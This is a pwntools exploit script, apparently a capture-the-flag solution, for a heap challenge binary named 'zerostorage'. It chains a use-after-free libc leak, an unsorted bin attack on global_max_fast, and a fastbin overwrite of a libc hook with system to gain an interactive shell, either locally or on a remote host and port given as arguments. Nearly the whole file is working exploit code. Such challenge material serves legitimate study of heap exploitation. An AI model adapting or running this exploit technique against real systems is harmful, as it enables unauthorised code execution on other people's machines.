#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64", log_level="debug")
localfile = "./zerostorage"
locallibc = "/home/liu/src/how2heap/glibc_versions/2.26/x64_notcache/lib/libc-2.26.so"

def insert(length, data):
    io.recvuntil("Your choice: ")
    io.sendline(b"1")
    io.recvuntil("Length of new entry: ")
    io.sendline(str(length))
    io.recvuntil("Enter your data: ")
    data = data.ljust(length, b"\x00")
    io.send(data)

def update(id, length, data):
    io.recvuntil("Your choice: ")
    io.sendline(b"2")
    io.recvuntil("Entry ID: ")
    io.sendline(str(id)) 
    io.recvuntil("Length of entry: ")
    io.sendline(str(length))
    io.recvuntil("Enter your data: ")
    data = data.ljust(length, b"\x00")
    io.send(data)

def merge(id1, id2):
    io.recvuntil("Your choice: ")
    io.sendline(b"3")
    io.recvuntil("Merge from Entry ID: ")
    io.sendline(str(id1))
    io.recvuntil("Merge to Entry ID: ")
    io.sendline(str(id2))

def delete(id):
    io.recvuntil("Your choice: ")
    io.sendline(b"4")
    io.recvuntil("Entry ID: ")
    io.sendline(str(id))

def view(id):
    io.recvuntil("Your choice: ")
    io.sendline(str(5))
    io.recvuntil("Entry ID: ")
    io.sendline(str(id))
    io.recvuntil("Entry No." + str(id) + ":\n")
    

def exp():
    # uaf, leak libc base from unsorted bin
    insert(0x10, b"")           # 0
    insert(0x10, b"/bin/sh")    # 0, 1
    insert(0xf8, b"")           # 0, 1, 2
    merge(0, 0)                 #    1, 2, 3
    view(3)
    libc_base = u64(io.recv(8)) - 0x3ABC60

    # unsorted bin attack
    maxfast_addr = libc_base + libc.sym["global_max_fast"]
    update(3, 0x10, p64(0xdeadbeef) + p64(maxfast_addr-0x10))
    insert(0x80, b"")           # 0, 1, 2, 3

    # fastbin attack
    merge(2, 2)                 # 0, 1,    3, 4
    update(4, 0x1f0, p64(libc_base+0x3AD84F))
    insert(0x1f0, b"")          # 0, 1, 2, 3, 4
    payload = p8(0)*0x49 + p64(libc_base+libc.sym["system"])
    insert(0x1f0, payload)      # 0, 1, 2, 3, 4, 5

    delete(1)
    
    io.interactive() 


argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

elf = ELF(localfile)
libc = ELF(locallibc)
exp()